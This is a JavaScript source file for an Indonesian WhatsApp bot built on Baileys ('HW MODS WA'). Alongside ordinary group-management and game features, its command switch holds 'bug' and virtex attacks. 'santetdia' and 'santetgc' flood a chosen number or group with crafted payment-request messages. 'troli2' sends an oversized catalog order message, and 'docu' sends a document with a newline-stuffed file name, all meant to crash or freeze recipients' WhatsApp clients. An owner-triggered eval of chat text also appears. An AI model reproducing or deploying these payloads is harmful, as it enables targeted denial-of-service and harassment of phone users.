/*
› Create By Haikal
› Base Ori Haikal

🌷 KALAU MAU RENAME TARO CREDITS GUA : HW MODS WA */

//=================================================//
require('./hwkal')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const path = require('path')
const os = require('os')
const cl = require('caliph-api') 
const crypto = require('crypto')
const hx = require('hxz-api')
const mel = require('kitsune-api')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const google = require('google-it')
const mathjs = require('mathjs')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const { exec, spawn, execSync } = require("child_process")
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { virtex1 } = require('./baseikal/virtex/virtex1')
const { virtex2 } = require('./baseikal/virtex/virtex2')
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser } = require('./baseikal/lib/register')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
const content = JSON.stringify(m.message)
//=================================================//
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
const kalimage = fs.readFileSync ('./baseikal/image/hwmodsgans.jpg')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const mekih = fs.readFileSync ('./baseikal/image/deden.jpeg')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
//=================================================//
// Function
wm = 'HW MODS WA'
//=================================================//
// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {

haikal.readMessages([m.key])
 try {
 var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await haikal.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isBan = banned.includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
//=================================================//
// Group
const groupMetadata = m.isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
const _registered = JSON.parse(fs.readFileSync('./baseikal/dbnye/registered.json'));
const register = JSON.parse(fs.readFileSync('./baseikal/dbnye/register.json'));
const isRegistered = checkRegisteredUser(m.sender)
//=================================================//
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
// Random Image Simple Menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//document randomizer
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
// Date
moment.tz.setDefault("Asia/Jakarta").locale("id");

//=================================================//
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"externalAdReply": {
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/c/HwModsWa857`,
"thumbnailUrl": 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
"thumbnail": kalimage
}}}
//=================================================//
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `HW MODS WA${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
//=================================================//
//=================================================//
const bal= (teks) => {
haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `HW MODS WA ${ngazap(prefix)}`,"body": `HW MODS WA ${ngazap(prefix)}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: doc })
} 
// Target
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: hw })
} 

const anjay = (teks) => {
 haikal.sendMessage(m.chat, { image: kalimage, caption: teks, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
thumbnail: kalimage,
}
}}, { quoted:hw})
}
//=================================================//
const deploy = (teks) => {
  haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
} else global.db.data.chats[m.chat] = {
mute: false,
}
} catch (err) {
console.log(err)
}
//=================================================//
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await haikal.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
// reset limit every 12 hours
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
async function replyReg(teks) {
const anakau = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`Haii 👋 Kak ${pushname} Selamat ${salam} *Aku Adalah Bot Hw Mods*
Agar Bot Bisa Di Gunakan Silahkan Ketik [ Verifikasi ] Di Group Apapun
 `
}
haikal.sendMessage(m.chat, anakau, {quoted: hw})
}
async function sendButRegis(from) {
var serialUser = createSerial(18)
_registered.push(sender)
fs.writeFileSync('./baseikal/dbnye/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `
Haii 👋 Kak ${pushname} Selamat ${salam} 

🌷 Nama : ${pushname}
🌷 Status : Verifikasi
🌷 Total User : ${_registered.length}

*Silahkan Ketik Menu Untuk Menggunakan Bot`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
//=================================================// 
// Public & Self
if (!haikal.public) {
if (!m.key.fromMe) return
}
//console bukan kontol
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/wait.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BotAdman.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/owner.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BanLu.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/groupon.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SiGroupadmin.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}
//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await haikal.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
anjay(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return anjay(bvl)
if (m.key.fromMe) return anjay(bvl)
if (isCreator) return anjay(bvl)
kice = m.sender
await haikal.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
haikal.sendMessage(from, {text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:hw})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: hw.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
try {
return anjay(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
anjay(e)
}
}
//=================================================//
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
haikal.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
haikal.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) haikal.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) haikal.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) haikal.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
haikal.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
anjay(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
anjay(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
haikal.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
anjay(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
anjay(`
Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
//=================================================//
case 'inibug': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
case 'poll': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT HW MODS WA",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM BROTHER BY HW MODS WA"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('sukses sendbug')
}
break
//=================================================//
case 'troli2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"orderMessage": {
	"orderId": "599519108102353",
	"thumbnail": virgam,
	"itemCount": 1999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " BY HW MODS WA V2 ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6281214281312@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'jagoanom' : {
if (!isCreator) return
if (isBan) throw sticBanLu(from)

haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
thumbnail: virgam,
}
}}}}}, { quoted:doc})
}
break
case 'santetdia': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
anjay(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER HW MODS WA`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
anjay(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'santetgc': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
anjay(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER HW MODS WA`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
anjay(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'ducu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`Haikal APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
break
case 'daca': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`Haikal APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 break
case 'docu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "🔥🔥",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Zero To The Bastrad ️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.                                                                                  